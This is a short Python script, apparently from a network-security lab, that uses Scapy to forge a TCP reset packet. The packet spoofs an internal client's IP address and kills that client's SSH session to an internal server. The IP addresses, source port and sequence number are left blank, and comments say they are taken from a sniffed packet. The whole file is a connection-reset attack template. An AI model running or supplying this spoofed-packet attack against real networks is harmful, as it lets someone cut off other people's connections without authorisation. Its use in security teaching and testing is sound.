import sys
#importing all libraries for scapy
from scapy.all import *

print("sending reset packet to internal server impersonating as internal client....")

#src is Internal client IP and dst is Internal server IP
IPLayer = IP (src="", dst = "")

#dport is 22 because this is an SSH connection.
#flag is R because we are trying to reset the connection.
# sport and seq are obained from latest tcp packet captured.
TCPLayer = TCP (sport=, dport=22, flags="R", seq=)

pkt=IPLayer/TCPLayer
ls(pkt)
send(pkt,verbose=0)

